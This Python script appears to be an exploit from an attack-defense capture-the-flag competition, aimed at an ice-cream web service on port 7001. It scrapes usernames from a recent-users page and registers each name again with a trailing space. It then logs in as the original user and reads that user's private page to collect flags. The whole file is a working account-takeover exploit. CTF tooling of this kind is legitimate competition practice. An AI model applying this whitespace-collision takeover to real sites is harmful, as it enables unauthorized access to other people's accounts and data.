#!/usr/bin/env python3

import sys
import re
import requests
import checklib

class AttackError(Exception):
    pass

@checklib.wraps_down
def attack(host: str, port: int) -> None:
    url = f"http://{host}:{port}"
    resp = requests.get(url + "/lastusers")

    users = re.findall(r"<br>(\w*)", resp.text)
    flags = []

    for u in users:
        requests.get(
            url + "/registerForm", params={"login": u + " ", "password": "somepassword"}
        )
        s = requests.Session()
        s.get(url + "/loginForm", params={"login": u, "password": "somepassword"})
        r = s.get(url + "/icecreams")
        text = r.text
        # sometimes it's a random html page?
        if text.startswith("Your icecreams: <br>"):
            flags.append(text)
            print(text)

    if len(flags) == 0:
            raise AttackError("No flags")

if __name__ == "__main__":
    attack(sys.argv[1], 7001)
